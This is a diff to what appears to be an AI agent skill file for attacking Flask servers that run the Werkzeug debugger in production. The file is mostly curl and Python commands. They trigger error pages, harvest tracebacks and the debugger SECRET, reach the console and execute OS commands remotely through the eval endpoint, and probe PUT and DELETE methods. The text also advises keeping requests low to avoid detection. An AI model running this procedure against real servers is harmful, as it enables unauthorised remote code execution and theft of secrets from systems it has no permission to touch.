@@ -21,30 +21,30 @@ Flask applications with `debug=True` enable the Werkzeug debugger, which exposes
 - A `?__debugger__=yes` parameter appears in URL resources (CSS, JS, PNG)
 - The error page contains `var CONSOLE_MODE`, `var EVALEX`, or `SECRET=` in the HTML
 
+## Prerequisites
+
+- `terminal` with curl
+- A Flask API server with `debug=True` in production (misconfiguration)
+- An endpoint that triggers HTTP 500 (unhandled exception)
+
 ## How to Run
 
 ```bash
 # Check if Werkzeug debugger is active — trigger an error
-TARGET=target.com
-PORT=5000   # set to the observed Werkzeug port
+export TARGET=target.com
+export PORT=5000   # set to the observed Werkzeug port
 
-curl --max-time 30 --connect-timeout 10 -sk "https://target.com:PORT/sitemap.xml" 2>/dev/null | grep -oE "(Werkzeug|Debugger|SECRET|CONSOLE_MODE|EVALEX)" | head -5
+curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}/sitemap.xml" 2>/dev/null | grep -oE "(Werkzeug|Debugger|SECRET|CONSOLE_MODE|EVALEX)" | head -5
 
 # Try to trigger error on common paths
 for path in "/error" "/500" "/test" "/debug" "/sitemap.xml" "/env" "/config"; do
-  result=$(curl --max-time 30 --connect-timeout 10 -sk "https://target.com:PORT$path" 2>/dev/null)
+  result=$(curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}$path" 2>/dev/null)
   if echo "$result" | grep -q "Traceback\|Error\|Werkzeug"; then
     echo "TRIGGERED: $path"
     echo "$result" | grep -oE '(File|Error|SECRET|CONSOLE_MODE|EVALEX)[^<]*' | head -5
   fi
 done
 ```
-
-## Prerequisites
-
-- `terminal` with curl
-- A Flask API server with `debug=True` in production (misconfiguration)
-- An endpoint that triggers HTTP 500 (unhandled exception)
 
 ## Procedure
 
@@ -54,14 +54,14 @@ The phases below are the procedure. Keep each probe bounded (`--max-time`), reco
 
 ```bash
 # Check if Werkzeug debugger is active — trigger an error
-TARGET=target.com
-PORT=5000   # set to the observed Werkzeug port
+export TARGET=target.com
+export PORT=5000   # set to the observed Werkzeug port
 
-curl --max-time 30 --connect-timeout 10 -sk "https://target.com:PORT/sitemap.xml" 2>/dev/null | grep -oE "(Werkzeug|Debugger|SECRET|CONSOLE_MODE|EVALEX)" | head -5
+curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}/sitemap.xml" 2>/dev/null | grep -oE "(Werkzeug|Debugger|SECRET|CONSOLE_MODE|EVALEX)" | head -5
 
 # Try to trigger error on common paths
 for path in "/error" "/500" "/test" "/debug" "/sitemap.xml" "/env" "/config"; do
-  result=$(curl --max-time 30 --connect-timeout 10 -sk "https://target.com:PORT$path" 2>/dev/null)
+  result=$(curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}$path" 2>/dev/null)
   if echo "$result" | grep -q "Traceback\|Error\|Werkzeug"; then
     echo "TRIGGERED: $path"
     echo "$result" | grep -oE '(File|Error|SECRET|CONSOLE_MODE|EVALEX)[^<]*' | head -5
@@ -99,9 +99,11 @@ File "/var/www/html/target-app-backend/venv/lib/python3.10/site-packages/..."
 ### 1d — Full Code Context Extraction
 
 ```python
-import requests, re
+import os, requests, re
 
-resp = requests.get("https://target.com:PORT/ERROR_PATH", verify=False)
+HOST = os.environ.get("TARGET", "target.com")
+PORT = os.environ.get("PORT", "5000")
+resp = requests.get(f"https://{HOST}:{PORT}/ERROR_PATH", verify=False)
 traceback = resp.text
 
 # Extract all filenames from traceback frames
@@ -124,7 +126,7 @@ The Werkzeug debugger console allows Python code execution on the server IF `EVA
 
 ```bash
 # The SECRET and console mode are in the HTML
-curl --max-time 30 --connect-timeout 10 -sk "https://target.com:PORT/sitemap.xml" | grep -oE '(CONSOLE_MODE|EVALEX|EVALEX_TRUSTED|SECRET)="?[^"&;]+'
+curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}/sitemap.xml" | grep -oE '(CONSOLE_MODE|EVALEX|EVALEX_TRUSTED|SECRET)="?[^"&;]+'
 ```
 
 ### 2b — Console Access (if enabled)
@@ -133,7 +135,7 @@ If `EVALEX=true`:
 
 ```bash
 # Access the console
-curl --max-time 30 --connect-timeout 10 -sk "https://target.com:PORT/console"
+curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}/console"
 ```
 
 **Signal check:** If `/console` returns HTTP 400 (not 404), the debugger IS active but the console is disabled. HTTP 404 means no debugger at all. HTTP 200 with console UI means RCE is available.
@@ -142,11 +144,11 @@ If `EVALEX=true`:
 
 ```bash
 # Execute Python commands (POST to the debugger endpoint)
-curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com:PORT/sitemap.xml?__debugger__=yes&cmd=e&s=SECRET" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://${TARGET}:${PORT}/sitemap.xml?__debugger__=yes&cmd=e&s=SECRET" \
   -d "code=__import__('os').system('id')"
 
 # Alternative: GET-based eval
-curl --max-time 30 --connect-timeout 10 -sk "https://target.com:PORT/sitemap.xml?__debugger__=yes&cmd=eval&code=__import__('os').system('id')&s=SECRET"
+curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}/sitemap.xml?__debugger__=yes&cmd=eval&code=__import__('os').system('id')&s=SECRET"
 ```
 
 **Note:** The console endpoint may require specific method (POST vs GET) and may return HTTP 405 if the wrong method is used. Test both.
@@ -166,15 +168,15 @@ Beyond the specific error-triggering path, probe for other endpoints that may le
 
 ```bash
 # Path traversal in error generation
-curl --max-time 30 --connect-timeout 10 -sk "https://target.com:PORT/path/to/../sitemap.xml"
+curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}/path/to/../sitemap.xml"
 
 # Test various HTTP methods
-curl --max-time 30 --connect-timeout 10 -sk -X OPTIONS "https://target.com:PORT/sitemap.xml"
-curl --max-time 30 --connect-timeout 10 -sk -X PUT "https://target.com:PORT/sitemap.xml"
-curl --max-time 30 --connect-timeout 10 -sk -X DELETE "https://target.com:PORT/sitemap.xml"
+curl --max-time 30 --connect-timeout 10 -sk -X OPTIONS "https://${TARGET}:${PORT}/sitemap.xml"
+curl --max-time 30 --connect-timeout 10 -sk -X PUT "https://${TARGET}:${PORT}/sitemap.xml"
+curl --max-time 30 --connect-timeout 10 -sk -X DELETE "https://${TARGET}:${PORT}/sitemap.xml"
 
 # Check if error page returns CORS headers
-curl --max-time 30 --connect-timeout 10 -sk -D- "https://target.com:PORT/sitemap.xml" | grep -i access-control
+curl --max-time 30 --connect-timeout 10 -sk -D- "https://${TARGET}:${PORT}/sitemap.xml" | grep -i access-control
 ```
 
 ## Pitfalls
@@ -186,14 +188,9 @@ curl --max-time 30 --connect-timeout 10 -sk -D- "https://target.com:PORT/sitemap
 - **Triggering errors leaves logs.** Every debugger page request generates a 500 error in the server logs. Be conservative to avoid detection.
 
 ## Verification
-
-1. **Skill integrity** — confirm the skill file is well-formed:
-   ```bash
-   grep -q "name: flask-werkzeug-attack" SKILL.md && echo "PASS: frontmatter present" || echo "FAIL"
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-2. **Debugger discrimination** — a real finding requires the Werkzeug HTML traceback page (blue themed, collapsible frames), not any HTTP 500; the `/console` probe distinguishes 400 (console present) from 404 (absent).
-3. **RCE claims** — only count when EVALEX is enabled AND the console POST returns command output; a 200 on the console page alone is not code execution.
+- A finding requires the Werkzeug traceback HTML (collapsible frames, debugger assets), not any HTTP 500.
+- `/console` returning 400 proves the debugger is active but the console is disabled; only a console POST that returns command output proves RCE.
+- The full traceback frames and any leaked `SECRET` are recorded beneath `${OUTPUT_DIR:-./output}`.
 
 ---
 
